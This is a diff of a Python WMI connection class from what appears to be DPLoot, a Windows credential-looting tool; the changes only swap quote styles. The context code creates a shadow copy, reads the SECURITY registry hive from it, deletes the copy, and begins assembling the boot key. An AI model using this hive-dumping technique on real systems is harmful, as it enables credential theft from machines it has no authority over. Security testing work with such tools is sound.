@@ -41,11 +41,11 @@ class DPLootWMIConnection(DPLootConnection):
             try:
                 error_name = wmi.WBEMSTATUS.enumItems(call_status).name
             except ValueError:
-                error_name = 'Unknown'
-            logging.error('%s - ERROR: %s (0x%08x)' % (banner, error_name, call_status))
+                error_name = "Unknown"
+            logging.error("%s - ERROR: %s (0x%08x)" % (banner, error_name, call_status))
             return False
         else:
-            logging.debug('%s - OK' % banner)
+            logging.debug("%s - OK" % banner)
             return True
 
     def __prepare_path_and_share(self, path, share, isfile=True, double_escape=False):
@@ -60,7 +60,7 @@ class DPLootWMIConnection(DPLootConnection):
         else:
             path = f"\\{path}\\"    
         if double_escape:
-            path = path.replace('\\', '\\\\')
+            path = path.replace("\\", "\\\\")
         return path, share
     
     def __get_hive_to_wmihive(self, hive:str) -> bytes:
@@ -114,7 +114,7 @@ class DPLootWMIConnection(DPLootConnection):
     def is_admin(self) -> bool:
         return True # TODO c'est pour le debug
 
-    def list_dir(self, path, share:str='C:', wildcard=True) -> list[SharedFile]:
+    def list_dir(self, path, share:str="C:", wildcard=True) -> list[SharedFile]:
         if not wildcard:
             raise NotImplementedError("Not implemented for wildcard == False")
 
@@ -130,7 +130,7 @@ class DPLootWMIConnection(DPLootConnection):
             while not finished:
                 try:
                     class_object = enum_wbem_class_obj.Next(0xffffffff,1)[0]
-                    record_props = {a:b['value'] for a,b in dict(class_object.getProperties()).items()}
+                    record_props = {a:b["value"] for a,b in dict(class_object.getProperties()).items()}
                     record_attribs = 0
                     if record_props["FileType"] == "File Folder":
                         record_attribs |= ATTR_DIRECTORY 
@@ -164,7 +164,7 @@ class DPLootWMIConnection(DPLootConnection):
         if share != "": # not a UNC path
             path, share = self.__prepare_path_and_share(path, share)
         fullpath = f"{share}{path}"
-        escaped_path = fullpath.replace('\\', '\\\\')
+        escaped_path = fullpath.replace("\\", "\\\\")
         object_path = f'PS_ModuleFile.InstanceID="{escaped_path}"'
 
         logging.debug(object_path)
@@ -179,14 +179,14 @@ class DPLootWMIConnection(DPLootConnection):
 
         file_data = None
         for prop_name, prop_value in obj.items():
-            if prop_name == 'FileData':
-                file_data = prop_value['value']
+            if prop_name == "FileData":
+                file_data = prop_value["value"]
                 break
         
         if len(file_data) < 4:
             return None
           
-        file_length = struct.unpack('>I', bytes(file_data[0:4]))[0]
+        file_length = struct.unpack(">I", bytes(file_data[0:4]))[0]
         file_content = bytes(file_data[4:4 + file_length])
         
         logging.debug(f"Read {file_length} bytes from {fullpath}")
@@ -239,27 +239,27 @@ class DPLootWMIConnection(DPLootConnection):
         logging.debug(f"Shadow Copy created at ID {shadow_id}")
         
         # Finding it on disk
-        iEnum_shadow_copies = self.cimv2_namespace.ExecQuery(f"SELECT DeviceObject FROM Win32_ShadowCopy WHERE ID = \"{shadow_id}\"")
+        iEnum_shadow_copies = self.cimv2_namespace.ExecQuery(f'SELECT DeviceObject FROM Win32_ShadowCopy WHERE ID = "{shadow_id}"')
         obj = iEnum_shadow_copies.Next(0xffffffff, 1)[0]
         props = obj.getProperties()
-        shadow_copy = {k: v['value'] for k, v in props.items()}
+        shadow_copy = {k: v["value"] for k, v in props.items()}
         logging.debug(f"Found ShadowCopy at {shadow_copy['DeviceObject']}")
             
         # Get the SECURITY
         security_hive_path = f"{shadow_copy['DeviceObject']}\\Windows\\System32\\config\\SECURITY"
         security_hive = self.read_file(security_hive_path, "", looted_files=looted_files)
         if security_hive is not None:
-            logging.debug(f"Got SECURITY hive")
+            logging.debug("Got SECURITY hive")
         
         # Delete the dirty stuff
-        wmiPath = f"Win32_ShadowCopy.ID=\"{shadow_id}\""
+        wmiPath = f'Win32_ShadowCopy.ID="{shadow_id}"'
         logging.debug(f"Trying to delete ShadowCopy with ID {shadow_id}")
         ret = self.cimv2_namespace.DeleteInstance(wmiPath)
         if not self.__check_error("Deleting Shadow Copy",ret):
             logging.error("You will need to delete this by yourself.")
 
         # Get bootkey
-        bootKey = b''
+        bootKey = b""
         for key in ["JD","Skew1","GBG","Data"]:
             # Actually, there is no way in pure WMI to request these key class values 
             # We could dump the SYSTEM hive the same way we dump the SECURITY
